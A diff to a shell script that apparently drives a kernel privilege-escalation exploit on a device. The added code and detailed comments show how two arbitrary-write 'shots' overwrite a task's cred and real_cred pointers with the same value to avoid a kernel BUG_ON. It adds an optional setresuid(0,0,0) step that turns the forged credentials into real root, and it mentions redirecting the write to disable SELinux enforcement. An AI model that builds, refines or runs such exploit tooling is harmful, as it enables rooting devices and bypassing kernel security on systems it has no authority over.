@@ -55,6 +55,16 @@ CHAINWAIT=${CHAINWAIT:-6000}
 NODRAIN=${NODRAIN:-1}
 ROUNDS=${ROUNDS:-1}
 CONTROL=${CONTROL:-0}
+# SAME_VALUE=1 (default): step 6 reuses step 5's observed write value, so both
+#   cred pointers can end up equal.  SAME_VALUE=0 restores the old behaviour
+#   (each shot sprays its own page -> divergent pair).  Only use 0 to reproduce
+#   a historical run.
+SAME_VALUE=${SAME_VALUE:-1}
+# LAUNDER=1: after the poke, the LT child issues setgroups(0,NULL) +
+#   setresgid(0,0,0) + setresuid(0,0,0) to replace the fake cred with a real one.
+#   ★ It REFUSES unless the same-value provenance is declared, because
+#   commit_creds (which setresuid itself calls) panics on a divergent pair.
+LAUNDER=${LAUNDER:-0}
 # EXTRA: appended verbatim to every shot's env.  Use it to change the WRITE
 # TARGET without touching anything else, e.g. EXTRA=V12_W7_MIMIC_W1=1 makes the
 # W7 chain write to the global selinux_enforcing instead of task+0x778.
@@ -89,6 +99,21 @@ svc_count() {
 # ---- kernel log: host-side poll, deduped by kernel timestamp ----------------
 start_klog() {
     [ -n "$POLLPID" ] && return 0
+    # ★ 2026-09-18 (晚): hard guard.  Run 10's capture died here with
+    #   `run_bootA.sh: line 152: .../run10_061604/klog.host: No such file or directory`
+    # and the consequence was not a missing file, it was a MISSING REBOOT: the
+    # only window that could have bracketed run 10's death was never recorded, so
+    # the run's capture is the next boot instead.  That single failure is why the
+    # "all reboots were orderly, no panic" claim had a sample of 1.  Do not let a
+    # redirect decide whether we can diagnose a reboot: create the directory and
+    # refuse to proceed silently if it still cannot be opened.
+    mkdir -p "$(dirname "$KLOG")" 2>/dev/null
+    if ! : > "$KLOG" 2>/dev/null; then
+        say "  !! FATAL: cannot create $KLOG — the kernel-log capture would be lost."
+        say "     A run whose reboot cannot be captured is a run that cannot be"
+        say "     diagnosed.  Aborting before the shots."
+        exit 4
+    fi
     # create the file eagerly: the loop below only writes once it has data, so an
     # empty first fetch (e.g. racing the SELinux flip) would leave the file
     # missing and later `wc -l < "$KLOG"` would fail.  Run 10 hit exactly that.
@@ -189,7 +214,7 @@ done
 say "=== step 4: LT child (pure userspace spin, NO_EXEC) ==="
 TASK=""; CPID=""; PPID_LT=""
 for attempt in $(seq 1 12); do
-    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_RESULT_FILE=$RES V12B_EVIDENCE=$DEV/bootA_lt_ev_$TAG.txt V12_NO_EXEC=1 ./$(basename "$BIN") LT > $DEV/bootA_lt_$TAG.log 2>&1 </dev/null &"
+    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_RESULT_FILE=$RES V12B_EVIDENCE=$DEV/bootA_lt_ev_$TAG.txt V12_NO_EXEC=1 V12_LAUNDER=$LAUNDER V12_W7_SAME_VALUE=$SAME_VALUE ./$(basename "$BIN") LT > $DEV/bootA_lt_$TAG.log 2>&1 </dev/null &"
     for i in $(seq 1 25); do
         sleep 1
         TASK=$(A "cat $TASKF 2>/dev/null" | tr -d '\r\n')
@@ -225,7 +250,20 @@ while [ -d /proc/$p ]; do
   u=$(cut -d" " -f1 /proc/uptime)
   v=$(sed -n "s/^Uid:[[:space:]]*//p" /proc/$p/status 2>/dev/null)
   w=$(sed -n "s/^Gid:[[:space:]]*//p" /proc/$p/status 2>/dev/null)
-  n="$v|$w"
+  # ★ 2026-09-18 (晚): utime/stime + voluntary_ctxt_switches.
+  #   /proc/<pid>/stat fields 14/15 are utime/stime in jiffies; after stripping
+  #   the "pid (comm)" prefix (comm may contain spaces) they are fields 12/13.
+  #   The LT child is *supposed* to sit in a PURE USERSPACE spin between the
+  #   shots and the poke -- no syscall at all -- which is the premise that makes
+  #   the divergence latent.  Until now that premise was only a comment.  It has
+  #   a signature: utime climbs, stime stays FLAT, nvcsw does not move.  If
+  #   stime or nvcsw moves during the window, the child is issuing syscalls and
+  #   every "no commit_creds could have run" argument has to be re-derived.
+  st=$(sed -n "s/^[^)]*) //p" /proc/$p/stat 2>/dev/null)
+  ut=$(echo "$st" | cut -d" " -f12)
+  kt=$(echo "$st" | cut -d" " -f13)
+  nv=$(sed -n "s/^voluntary_ctxt_switches:[[:space:]]*//p" /proc/$p/status 2>/dev/null)
+  n="$v|$w|ut=$ut|st=$kt|nv=$nv"
   if [ "$n" != "$last" ]; then echo "$u $n"; last="$n"; fi
   sleep 0.05
 done
@@ -353,18 +391,61 @@ shot_until() {   # $1=off $2=extra $3=tag $4=rounds -> 0 if the readback moved
 say "  starting uid.stream on pid $CPID (device-side, 50 ms, change-triggered)"
 uid_stream_start "$CPID" "$OUT/uid.stream"
 say "=== step 5: 0x778 shot(s) (real_cred) ==="
+# ★★★ 2026-09-18 (晚): THE TWO SHOTS MUST WRITE THE SAME VALUE.
+#
+# `commit_creds()` opens with BUG_ON(task->cred != task->real_cred) and this
+# kernel has PANIC_ON_OOPS=y, so the two cred pointers must be IDENTICAL when
+# anything commits creds on the victim.  BUG_ON compares POINTERS, not the
+# contents behind them.
+#
+# Until now step 5 and step 6 each fired with empty $extra, so each sprayed its
+# OWN fresh page and the pair was (pageA, pageB) -- divergent even when both
+# landed.  Evidence, run 9 (evidence/2026-09-18-bootA/run9_0606.log L26/L40):
+#     0x778 shot write value = private cred page 0xffffff88679bade0
+#     0x780 shot write value = private cred page 0xffffff8785d6ade0
+# Same shape in run 3 (0xffffff8787b5ade0 vs 0xffffff881bad2de0).
+#
+# The old chain that DID survive to ksud (out/t5_w7_778.txt + out/t5_w7_780.txt,
+# 09-14) wrote `0xffffff802a7e0be0` -- the init_cred P0 alias, one fixed global
+# -- to BOTH slots.  tools/t5loop.sh applies a single $ENVV to every offset, so
+# MODE=CRED made both shots identical by construction.  That, not the landing,
+# is what separated cell 2 from cell 3.
+#
+# So: step 6 now reuses step 5's observed value verbatim.  The first shot's PIN
+# child must outlive the second shot (HOLD >= ~180 s), or the page is freed and
+# reallocated and "same value" becomes a dangling pointer.
+V778=""
 if [ "$CONTROL" = "1" ]; then
     say "  ⚠ CONTROL: V12_ALLOW_INIT_CRED=1 — write_value = the init_cred image"
     shot_until 0x778 "V12_ALLOW_INIT_CRED=1 V12_W7_INIT_CRED=1" w778ctl "$ROUNDS" || true
+    # Same value again for the second slot -- this is exactly cell 2.
+    V778="V12_ALLOW_INIT_CRED=1 V12_W7_INIT_CRED=1"
+    say "  [same-value] step 6 will reuse the init_cred image (cell-2 reproduction)"
 else
     shot_until 0x778 "" w778 "$ROUNDS" || true
+    V778="V12_W7_VALUE=$(sed -n 's/.*write_value *= *\(0x[0-9a-f]*\).*/\1/p' \
+            "$OUT"/w7_w778*.txt 2>/dev/null | tail -1)"
+    case "$V778" in
+        *"V12_W7_VALUE=0x"*)
+            say "  [same-value] step 6 will reuse $V778"
+            say "               (pointer identity follows by construction; content"
+            say "                agreement alone can NEVER prove it -- see below)" ;;
+        *)  V778=""
+            say "  ⚠ [same-value] could NOT recover step 5's write value."
+            say "    Firing step 6 now would spray a SECOND, DIFFERENT page and leave"
+            say "    real_cred != cred -- a latent hard BUG_ON.  Refusing."
+            say "    Re-run with ROUNDS>=1 and check $OUT/w7_w778*.txt, or set"
+            say "    EXTRA=V12_W7_VALUE=0x... explicitly, or SAME_VALUE=0 to force it." ;;
+    esac
 fi
 U778=$(uid_line "$CPID")
 say "  after 0x778: [$U778]   (recorded as data; the gate is 0x780 + repair)"
 
 say "=== step 6: 0x780 shot(s) (cred) ==="
 CRED=""
-if shot_until 0x780 "" w780 "$ROUNDS"; then
+if [ -z "$V778" ] && [ "${SAME_VALUE:-1}" != "0" ]; then
+    say "  ✗ step 6 SKIPPED (no same-value guarantee — see above)"
+elif shot_until 0x780 "$V778" w780 "$ROUNDS"; then
     say "  after 0x780: [$(uid_line "$CPID")]"
     CRED=$(grep -h -m1 'write value = private cred page' "$OUT"/w7_w780*.txt 2>/dev/null \
            | sed -n 's/.*page \(0x[0-9a-f]*\).*/\1/p' | tail -1)
